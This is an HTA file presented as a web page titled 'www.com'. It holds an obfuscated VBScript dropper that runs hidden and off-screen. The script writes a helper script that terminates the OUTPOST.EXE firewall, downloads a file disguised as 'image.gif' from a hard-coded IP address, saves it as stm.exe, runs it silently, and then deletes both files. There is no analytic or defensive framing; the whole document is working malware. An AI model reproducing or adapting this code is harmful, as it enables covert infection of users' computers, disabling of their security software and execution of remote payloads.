<HTML>
<HEAD>
<TITLE>www.com</TITLE>
<img src='http://www.com/4/pic.jpg' width=605 height=390>
<HTA:APPLICATION ID="Q" APPLICATIONNAME="Q" BORDER="none"
CONTEXTMENU="no" BORDERSTYLE="normal" CAPTION="no" ICON="" 
 MINIMIZEBUTTON="no" SHOWINTASKBAR="no" MAXIMIZEBUTTON="no"
SINGLEINSTANCE="no" SYSMENU="no"  WINDOWSTATE="minimize" VERSION="1.0" />
<SCRIPT LANGUAGE="VBScript">
self.MoveTo 5500,5500 
MyFile = dirsystem&"\q911.vbs"
drte52f = "ileSyst"
asd13 = "ripti"
Set qwe = CreateObject("Sc"+asd13 +"ng.F"+drte52f+"emObject")

Set asd = qwe.CreateTextFile(MyFile, True)

asd.write "WScript.Sleep(1000)" & vbcrlf
asd.write "strComputer = "".""" & vbcrlf
qwe13="ocessL"
asd.write "Set objWMIService = GetObject(""winmgmts:"" _" & vbcrlf
asd.write "    & ""{impersonationLevel=impersonate}!\\"" & strComputer & ""\root\cimv2"")" & vbcrlf
asd.write "Set colPr" + qwe13 + "ist = objWMIService.ExecQuery _ " & vbcrlf
asd.write "    (""SELECT * FROM Win32_Process WHERE Name = 'OUTPOST.EXE'"")" & vbcrlf
asd.write "For Each objProcess in colProcessList" & vbcrlf
asd.write "    objProcess.Terminate()" & vbcrlf
asd.write "Next" & vbcrlf
asd.write "Dim BD" & vbcrlf
asd.write "Dim xml" & vbcrlf
asd.write "WScript.Sleep(5000)" & vbcrlf
asd.write "f5j545i = ""MLH""" & vbcrlf
asd.write "Set xml = CreateObject(""Microsoft.X""+f5j545i+""TTP"")" & vbcrlf
asd.write "xml.Open ""GET"", ""http://202.229.3.233/8/image.gif"", False" & vbCrlf
asd.write "xml.Send" & vbcrlf
asd.write "C=C=C=C" & vbcrlf
asd.write "BD = xml.ResponseBody" & vbcrlf
asd.write "C=C=C=C" & vbcrlf
asd.write "Const adTypeBinary = 1" & vbcrlf
asd.write "Const adSaveCreateOverWrite = 2" & vbcrlf
asd.write "C=C=C=C" & vbcrlf
asd.write "Dim BinaryStream" & vbcrlf
asd.write "C=C=C=C" & vbcrlf
asd.write "Set BinaryStream = CreateObject(""ADODB.Stream"")" & vbcrlf
asd.write "BinaryStream.Type = adTypeBinary" & vbcrlf
asd.write "A=A=A=A" & vbcrlf
asd.write "BinaryStream.Open" & vbcrlf
asd.write "BinaryStream.Write BD" & vbcrlf
asd.write "b=b=b=b" & vbcrlf
asd.write "BinaryStream.SaveToFile dirsystem&""\stm.exe"", adSaveCreateOverWrite" & vbCrlf
asd.write "Dim WshShell" & vbcrlf
asd.write "Set WshShell = CreateObject(""WScript.Shell"")" & vbcrlf
asd.write "WshShell.Run dirsystem&""\stm.exe"", 0, False" & vbCrlf
asd.write "WScript.Sleep(9000)" & vbCrlf
asd.close
Set qwe = Nothing
Set asd = Nothing

Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run dirsystem&"\q911.vbs", 0, True
Set fso = CreateObject("Scripting.FileSystemObject")
pthe = dirsystem&"\q911.vbs"
pth = dirsystem&"\stm.exe"
Set f1 = fso.GetFile(pthe)
Set f2 = fso.GetFile(pth)
f1.Delete
f2.Delete
</SCRIPT>
<script>window.close()</script>
</HEAD>
</html>
